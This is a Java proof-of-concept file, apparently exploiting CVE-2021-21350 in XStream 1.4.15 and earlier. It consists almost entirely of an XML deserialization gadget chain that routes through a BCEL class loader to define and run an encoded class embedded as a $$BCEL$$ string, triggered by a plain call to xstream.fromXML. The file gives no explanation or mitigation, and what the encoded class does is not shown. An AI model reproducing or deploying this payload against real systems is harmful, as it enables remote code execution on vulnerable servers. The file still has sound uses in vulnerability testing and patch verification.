package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * Code Execution BCEL <=1.4.15
 */
public class CVE_2021_21350 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='javafx.collections.ObservableList$1'/>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "      <dataHandler>\n" +
                "        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "          <contentType>text/plain</contentType>\n" +
                "          <is class='java.io.SequenceInputStream'>\n" +
                "            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>\n" +
                "                <names class='java.util.AbstractList$Itr'>\n" +
                "                  <cursor>0</cursor>\n" +
                "                  <lastRet>-1</lastRet>\n" +
                "                  <expectedModCount>0</expectedModCount>\n" +
                "                  <outer-class class='java.util.Arrays$ArrayList'>\n" +
                "                    <a class='string-array'>\n" +
                "                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$Q$7d$L$85$d2Z$be$F$bf$VO$82$89$Q$cf$Q$P$S$bdH$d4$88$c1$f3R7$b8$a4$b4M$v$86$7f$e4$99$8b$g$P$fe$A$7f$94q$ba$S$m$ba$87$99$7d$ef$cd$9b$d9$d9$af$ef$8fO$A$a780$a1$a3$60$a2$88$f5$UJQ$$$eb$d8$d0$b1$a9c$8b$n$d9$92$ae$M$cf$Y$e2$d5Z$8fAk$7b$8f$82$n$db$91$ae$b8$9e$8c$fa$o$b8$e7$7d$87$98B$c7$b3$b9$d3$e3$81$8c$f0$9c$d4$c2$t9VZ0h$88$v$l$f9$8eh$5cL$85$dddH$b5lg$de$da$ecz$93$c0$W$972$f2$Y$91$5e$l$f2gn$n$FC$c7$b6$85$j$ec2$94$3d_$b8$95$T$5eis$c7$9e8$3c$f4$82$3a$f7$7d$L$7b$d8g$uF$8e$86$c3$dd$B$N$b0$85$lJ$cfe$c8$fd$jL$d4$b2$f0$a6$3f$Uv$c8$90_Rw$T7$94$pz$869$Q$e1$C$94$aa$b5$ce$bf$g$daA$T$aa$e5QuE$ed$86$81t$H$cdU$c3m$e0$d9b$3cn$e2$QI$fa$eb$e8$c4$c0$a2$ed$u$9a$84$g$94$Z$e5$c4$f1$h$d8L$c9k$U$93$8aL$c2$a2h$fd$W$m$8d$M$e5$U$b2$L$f3$b9j$Gd$de$R$x$c4_$a1$3d$bc$40$bb$9a$v$ce$m_b$de$ad$AM1$G$n$8b$9ci$8a$96$9a$F$aa$cd$a9$5b$fe$H$d4$85$B$82$W$C$A$A</string>\n" +
                "                    </a>\n" +
                "                  </outer-class>\n" +
                "                </names>\n" +
                "                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>\n" +
                "                  <parent class='sun.misc.Launcher$ExtClassLoader'>\n" +
                "                  </parent>\n" +
                "                  <package2certs class='hashtable'/>\n" +
                "                  <classes defined-in='java.lang.ClassLoader'/>\n" +
                "                  <defaultDomain>\n" +
                "                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>\n" +
                "                    <principals/>\n" +
                "                    <hasAllPerm>false</hasAllPerm>\n" +
                "                    <staticPermissions>false</staticPermissions>\n" +
                "                    <key>\n" +
                "                      <outer-class reference='../..'/>\n" +
                "                    </key>\n" +
                "                  </defaultDomain>\n" +
                "                  <packages/>\n" +
                "                  <nativeLibraries/>\n" +
                "                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>\n" +
                "                  <defaultAssertionStatus>false</defaultAssertionStatus>\n" +
                "                  <classes/>\n" +
                "                  <ignored__packages>\n" +
                "                    <string>java.</string>\n" +
                "                    <string>javax.</string>\n" +
                "                    <string>sun.</string>\n" +
                "                  </ignored__packages>\n" +
                "                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>\n" +
                "                    <__path>\n" +
                "                      <paths/>\n" +
                "                      <class__path>.</class__path>\n" +
                "                    </__path>\n" +
                "                    <__loadedClasses/>\n" +
                "                  </repository>\n" +
                "                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>\n" +
                "                </processorCL>\n" +
                "              </iterator>\n" +
                "              <type>KEYS</type>\n" +
                "            </e>\n" +
                "            <in class='java.io.ByteArrayInputStream'>\n" +
                "              <buf></buf>\n" +
                "              <pos>0</pos>\n" +
                "              <mark>0</mark>\n" +
                "              <count>0</count>\n" +
                "            </in>\n" +
                "          </is>\n" +
                "          <consumed>false</consumed>\n" +
                "        </dataSource>\n" +
                "        <transferFlavors/>\n" +
                "      </dataHandler>\n" +
                "      <dataLen>0</dataLen>\n" +
                "    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }

}
